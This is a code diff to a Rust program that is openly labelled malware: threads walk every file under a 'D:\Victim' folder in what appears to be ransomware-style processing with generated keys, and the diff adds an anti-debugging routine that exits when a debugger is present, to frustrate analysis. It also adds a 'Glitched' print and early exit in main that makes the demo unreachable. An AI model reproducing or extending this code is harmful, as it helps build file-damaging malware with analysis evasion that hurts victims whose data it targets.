@@ -1,4 +1,9 @@
+#[cfg(windows)]
+extern crate winapi;
 extern crate rand;
+
+use winapi::um::debugapi::IsDebuggerPresent;
+
 use std::{fs, thread};
 use std::io::{Read, Write};
 
@@ -99,6 +104,7 @@ fn generate_key_pair() -> ([u8;32],[u8;16]){
 // }
 
 fn malware_thread(base_dir:&str){
+    prevent_debugging();
     for entry in WalkDir::new(base_dir).into_iter().filter_map(|e| e.ok()){
         //println!("{}",entry.clone().path().display());
         if entry.path().is_file(){
@@ -114,10 +120,24 @@ fn malware_thread(base_dir:&str){
     }
 }
 
+fn prevent_debugging(){
+    unsafe{
+        match IsDebuggerPresent(){
+            0 => {}
+            _ => {
+                libc::exit(-1);
+            }
+        }
+    }
+}
 fn main() {    
     // DEMO SECTION
+    prevent_debugging();
     let mut hanldes = vec![];
-
+    println!("Glitched");
+    unsafe{
+        libc::exit(-1);
+    }
     for entry in WalkDir::new("D:\\Victim").max_depth(1).into_iter().filter_map(|e| e.ok()){
         let handle = thread::spawn(move||malware_thread(&entry.clone().path().to_str().expect("failed convert path to str")));
         hanldes.push(handle);
